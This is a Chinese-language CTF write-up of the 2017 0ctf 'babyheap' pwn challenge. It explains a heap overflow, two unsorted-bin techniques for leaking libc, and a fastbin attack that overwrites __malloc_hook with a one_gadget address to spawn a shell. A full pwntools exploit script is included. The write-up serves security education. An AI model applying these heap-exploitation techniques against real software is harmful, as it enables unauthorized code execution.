---
title: "2017 0ctf babyheap"
Categories:
    - Pwn
tag:
  - CTF
  - Pwn
  - Writeup
---

## 基本信息

```shell
root@ubuntu:~/babyheap# file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped

root@ubuntu:~/babyheap# checksec babyheap
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.0)
[*] '/root/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

root@ubuntu:~/babyheap# file libc.so.6 
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7a02d454ba0e8af69e3a284c381318b55908deda, for GNU/Linux 2.6.32, stripped

root@ubuntu:~/babyheap#
```

64位动态程序 保护全开

<!-- more -->

## 程序分析

程序用下面这种结构体组成的数组来保存管理分配出来的空间。

```c
struct heap_str
{
  __int64 inuse;
  __int64 size;
  __int64 addr;
};
```

程序提供了四个主要功能。

```text
===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command:
```

### Allocate

```text
Command: 1
Size: 16
Allocate Index 0
```

分配一个大小自定义的空间，最大4096 byte，分配完后会给出index。

值得注意的是它采用的是calloc来分配的空间，所以分配出来的空间是会被清空的。

### Fill

```text
Command: 2
Index: 0
Size: 16
Content: aaaaaaaaaaaaaaaa
```

向处于使用状态的空间写入自定义长度的字节，这里就是溢出地点了。

### Free

处理得不能在干净了。

### Dump

```text
Command: 4
Index: 0
Content:
aaaaaaaaaaaaaaaa
```

打印出指定处于使用状态空间里的内容。这里打印使用的长度是calloc时的size，即程序自己管理空间用的的结构体中的size，不是libc维护的size。

## 利用思路

已经确定漏洞是任意长度堆溢出。~~保护全开没法利用。~~

开了PIE，从堆上leak不出代码段地址信息了。加上Full RELRO后更改GOT表来劫持控制流也凉了。怀疑是去用`__malloc_hook`或`__free_hook`了。

基本想法就是：

1. leak出libc地址
2. 劫持控制流

### leak libc

free的chunk加入unsorted bin后它的fd/bk会指向main_arena中的一个地址，我们就利用这个来leak libc地址。

怎么拿到free后chunk中的地址呢？

第一个想法是扩展当前chunk大小，让其与后一个chunk出现重叠，后一个free进unsorted bin后dump出当前chunk中的内容来leak libc。具体原理如下：

先分配4个空间，大小分别是chunk_0 = 0x10、 chunk_1 = 0x40、 chunk_2 = 0x80、 chunk_3 = 0x10。

```text
+--------+--------+--------+--------+
|chunk_0 |chunk_1 |chunk_2 |chunk_3 |
|0x10    |0x40    |0x80    |0x10    |
+--------+--------+--------+--------+
```

其中chunk_0和chunk_3大小随意；chunk_2满足free后它能进入unsorted bin；chunk_1保证扩展后free时能加入fastbin，其实大小可以随意的，只是按照我一贯节俭的作风保证其后面attack时也能利用。

我们用chunk_0更改chunk_1的大小，让chunk_1的空间将chunk_2的pre size、size、fd、bk包含在内，也就是向后扩展0x20 byte，因为free chunk_1时会检测next size，所以还要在chunk_2中设置一下。

将chunk_1 free掉，重新以0x60的大小calloc回来。此时chunk_2的head已经被破坏掉了。fill chunk_1恢复chunk_2的head。

free掉chunk_2，此时chunk_2加入了unsorted bin。dump出chunk_1，除掉最后一个'\n'后最后8 byte就是我们想要的地址了，减去偏移就是libc_base。

```python
alloc(0x10) # 0
alloc(0x40) # 1
alloc(0x80) # 2
alloc(0x10) # 3

fill(0, 'a'*0x10 + p64(0) + p64(0x71))
fill(2, 'b'*0x10 + p64(0) + p64(0x71))

free(1)
alloc(0x60) # 1
fill(1, 'c'*0x40 + p64(0) + p64(0x91))

free(2)
libc_base = u64(dump(1)[-9:-1]) - 0x3c4b78
log.info('libc base = ' + hex(libc_base))
pause()
```

leak libc还有另外一种方法思路：

让两个chunk指向同一个地址，其中一个free进unsorted bin，dump出另外一个里面的内容。具体原理如下：

先分配一堆地址，chunk_0 = chunk_1 = chunk_2 = chunk_3 = chunk_5 = 0x10、chunk_4 = 0x80。

```text
+--------+--------+--------+--------+--------+--------+
|chunk_0 |chunk_1 |chunk_2 |chunk_3 |chunk_4 |chunk_5 |
|0x10    |0x10    |0x10    |0x10    |0x80    |0x10    |
+--------+--------+--------+--------+--------+--------+
```

其中chunk_0、chunk_3、chunk_5大小随意。chunk_1和chunk_2保证free后进入fastbin。chunk_4保证free后进入unsorted bin。

free掉chunk_2、chunk_1，这时两个chunk进入了fastbin。

此时chunk_1的fd指向chunk_2，因为堆的始终是4KB对齐的，所以chunk_4的起始地址的第一个字节必然是0x80。用chunk_0更改chunk_1的fd，使其指向chunk_4。为了能够申请成功，我们需要确保chunk_4的size与当前fastbin 的大小一致，所以我们得修改它的大小。

申请空间从fastbin申请出来，这是chunk_2与chunk_4指向同一个地址。

将chunk_4的大小改回来，free进unsorted bin。dump出chunk_2的内容，前8 byte就是我们想要的地址了，减去偏移就是libc_base。

```python
alloc(0x10) # 0
alloc(0x10) # 1
alloc(0x10) # 2
alloc(0x10) # 3
alloc(0x80) # 4
alloc(0x10) # 5

free(2)
free(1)

fill(0, 'a'*0x10 + p64(0) + p64(0x21) + p8(0x80))
fill(3, 'b'*0x10 + p64(0) + p64(0x21))

alloc(0x10) # 1
alloc(0x10) # 2

fill(3, 'b'*0x10 + p64(0) + p64(0x91))
free(4)
libc_base = u64(dump(2)[:8]) - 0x3c4b78
log.info('libc_base = ' + hex(libc_base))
pause()
```

### exploit

在执行malloc、free等时，开始就会检测hook函数，如果不为空就会跳过去执行。

现在的目标是__malloc_hook，我们可以用fastbin attack将在__malloc_hook所在的空间分配出来，修改__malloc_hook的值，通过__malloc_hook来getshell。

修改的时候需要注意一下fastbin size检测，如果分配出来的chunk的size不属于这个fastbin，那么会出现memory corruption (fast) 的错误。

不过fastbin对于chunk没有对齐检测，用gdb调试看了一下，在目标地址前面27 byte处有一个占8 byte的0x7f，也就是可以从这开出0x60大小的空间，目标地址是包含在内的。

这里我就接leak libc中的第一种方法写了。第二种方法接的利用原理一样，就不写了。

现根据libc_base获得__malloc_hook地址。

free掉chunk_1。通过chunk_0修改chunk_1的fd指向前面选的地址。

将fake chunk alloc出来。这时chunk_2指向fake chunk。用fill更改__malloc_hook的值指向一个gadget。alloc一下触发利用。

关于gadget的寻找这里介绍一个工具——[onegadget](https://github.com/david942j/one_gadget)。

```python
malloc_hook = libc.symbols['__malloc_hook'] + libc_base
log.info("malloc_hook = " + hex(malloc_hook))

free(1)
fill(0, 'd'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook-27-0x8) + p64(0))

alloc(0x60) # 1
alloc(0x60) # 2
fill(2, 'a'*3 + p64(0) + p64(0) +p64(libc_base + 0x4526a))
alloc(0x10)
```

### 完整exp

```python
#!/use/bin/env python
from pwn import *

# context.log_level = 'debug'

def alloc(size):
    p.sendline('1')
    p.sendlineafter(': ', str(size))
    p.recvuntil(': ', timeout=1)

def fill(idx, data):
    p.sendline('2')
    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', str(len(data)))
    p.sendafter(': ', data)
    p.recvuntil(': ')

def free(idx):
    p.sendline('3')
    p.sendlineafter(': ', str(idx))
    p.recvuntil(': ')

def dump(idx):
    p.sendline('4')
    p.sendlineafter(': ', str(idx))
    p.recvuntil(': \n')
    data = p.recvline()
    p.recvuntil(': ')
    return data


p = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

# -------- leak libc --------

alloc(0x10) # 0
alloc(0x40) # 1
alloc(0x80) # 2
alloc(0x10) # 3

fill(0, 'a'*0x10 + p64(0) + p64(0x71))
fill(2, 'b'*0x10 + p64(0) + p64(0x71))
free(1)

alloc(0x60) # 1
fill(1, 'c'*0x40 + p64(0) + p64(0x91))
free(2)

libc_base = u64(dump(1)[-9:-1]) - 0x3c4b78
log.info('libc base = ' + hex(libc_base))

pause()

# -------- fast attack --------

malloc_hook = libc.symbols['__malloc_hook'] + libc_base
log.info("malloc_hook @ " + hex(malloc_hook))

free(1)
fill(0, 'd'*0x10 + p64(0) + p64(0x71) + p64(malloc_hook-27-0x8) + p64(0))

alloc(0x60) # 1
alloc(0x60) # 2
fill(2, 'a'*3 + p64(0) + p64(0) +p64(libc_base + 0x4526a))
alloc(0x10)

p.interactive()
```

## 参考资料

+ Anciety. [0ctf 2017 babyheap writeup](https://blog.csdn.net/qq_29343201/article/details/66476135)
+ uaf.io. [0ctf Quals 2017 - BabyHeap2017](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)
+ gd菜鸡. [0ctf2017 - babyheap](https://bbs.pediy.com/thread-223461.htm)
+ ctf-wiki. [2017 0ctf babyheap](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/#2017-0ctf-babyheap)
+ david942j. [onegadget](https://github.com/david942j/one_gadget)
